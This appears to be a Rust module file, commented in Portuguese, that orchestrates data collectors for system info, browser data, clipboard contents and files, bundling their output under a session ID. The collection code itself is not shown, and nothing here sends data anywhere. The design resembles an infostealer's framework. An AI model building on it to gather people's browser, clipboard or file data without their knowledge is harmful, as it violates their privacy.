//! Data collectors module

pub mod system_info;
pub mod browser;
pub mod clipboard;
pub mod files;

use std::collections::HashMap;
use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};
use thiserror::Error;
use tracing::info;

pub use system_info::SystemInfoCollector;
pub use browser::BrowserCollector;
pub use clipboard::ClipboardCollector;
pub use files::FileCollector;

#[derive(Error, Debug)]
pub enum CollectorError {
    #[error("not supported: {0}")]
    #[allow(dead_code)]
    NotSupported(String),
    
    #[error("collection failed: {0}")]
    CollectionFailed(String),
    
    #[error("io: {0}")]
    IoError(#[from] std::io::Error),
    
    #[error("json: {0}")]
    SerializationError(#[from] serde_json::Error),
    
    #[error("unknown module: {0}")]
    UnknownModule(String),
}

/// Trait principal para todos os coletores
pub trait Collector: Send + Sync {
    /// Nome identificador do coletor
    fn name(&self) -> &str;
    
    /// Executa a coleta de dados
    fn collect(&self) -> Result<ModuleData, CollectorError>;
    
    /// Verifica se o coletor é suportado na plataforma atual
    fn is_supported(&self) -> bool;
    
    /// Prioridade de execução (maior = primeiro)
    fn priority(&self) -> u8 {
        50
    }
}

/// Dados coletados agregados
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CollectedData {
    /// Timestamp da coleta
    pub timestamp: DateTime<Utc>,
    
    /// ID único da sessão
    pub session_id: String,
    
    /// Dados de cada módulo
    pub modules: HashMap<String, ModuleData>,
    
    /// Metadados da coleta
    pub metadata: CollectionMetadata,
}

impl CollectedData {
    /// Cria nova instância
    pub fn new() -> Self {
        Self {
            timestamp: Utc::now(),
            session_id: uuid::Uuid::new_v4().to_string(),
            modules: HashMap::new(),
            metadata: CollectionMetadata::default(),
        }
    }
    
    /// Adiciona dados de um módulo
    pub fn add_module(&mut self, name: String, data: ModuleData) {
        self.modules.insert(name, data);
    }
}

impl Default for CollectedData {
    fn default() -> Self {
        Self::new()
    }
}

/// Metadados da coleta
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct CollectionMetadata {
    /// Duração total da coleta em ms
    pub duration_ms: u64,
    
    /// Número de módulos executados
    pub modules_run: u32,
    
    /// Número de módulos com sucesso
    pub modules_success: u32,
    
    /// Erros encontrados
    pub errors: Vec<String>,
}

/// Dados de um módulo específico
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum ModuleData {
    /// Informações do sistema
    System(system_info::SystemData),
    
    /// Dados de navegadores
    Browser(browser::BrowserData),
    
    /// Dados da área de transferência
    Clipboard(clipboard::ClipboardData),
    
    /// Arquivos encontrados
    Files(files::FileData),
    
    /// Dados genéricos (JSON)
    Generic(serde_json::Value),
}

/// Gerenciador de coletores
pub struct CollectorManager {
    collectors: Vec<Box<dyn Collector>>,
}

impl CollectorManager {
    /// Cria novo gerenciador
    pub fn new() -> Self {
        Self {
            collectors: Vec::new(),
        }
    }
    
    /// Registra um módulo pelo nome
    pub fn register_module(&mut self, name: &str) -> Result<(), CollectorError> {
        let collector: Box<dyn Collector> = match name.to_lowercase().as_str() {
            "system" => Box::new(SystemInfoCollector::new()),
            "browser" => Box::new(BrowserCollector::new()),
            "clipboard" => Box::new(ClipboardCollector::new()),
            "files" => Box::new(FileCollector::new()),
            other => return Err(CollectorError::UnknownModule(other.to_string())),
        };
        
        if collector.is_supported() {
            info!("Registrado coletor: {}", name);
            self.collectors.push(collector);
        } else {
            info!("Coletor não suportado nesta plataforma: {}", name);
        }
        
        Ok(())
    }
    
    /// Retorna número de coletores registrados
    pub fn collector_count(&self) -> usize {
        self.collectors.len()
    }
    
    /// Executa todos os coletores
    pub async fn run_all(&self) -> Result<CollectedData, CollectorError> {
        let start = std::time::Instant::now();
        let mut collected = CollectedData::new();
        let mut errors = Vec::new();
        
        // Ordenar por prioridade
        let mut collectors: Vec<_> = self.collectors.iter().collect();
        collectors.sort_by(|a, b| b.priority().cmp(&a.priority()));
        
        for collector in collectors {
            info!("Executando coletor: {}", collector.name());
            
            match collector.collect() {
                Ok(data) => {
                    collected.add_module(collector.name().to_string(), data);
                    collected.metadata.modules_success += 1;
                }
                Err(e) => {
                    let error_msg = format!("{}: {}", collector.name(), e);
                    tracing::warn!("Erro no coletor {}: {}", collector.name(), e);
                    errors.push(error_msg);
                }
            }
            
            collected.metadata.modules_run += 1;
        }
        
        collected.metadata.duration_ms = start.elapsed().as_millis() as u64;
        collected.metadata.errors = errors;
        
        Ok(collected)
    }
}

impl Default for CollectorManager {
    fn default() -> Self {
        Self::new()
    }
}

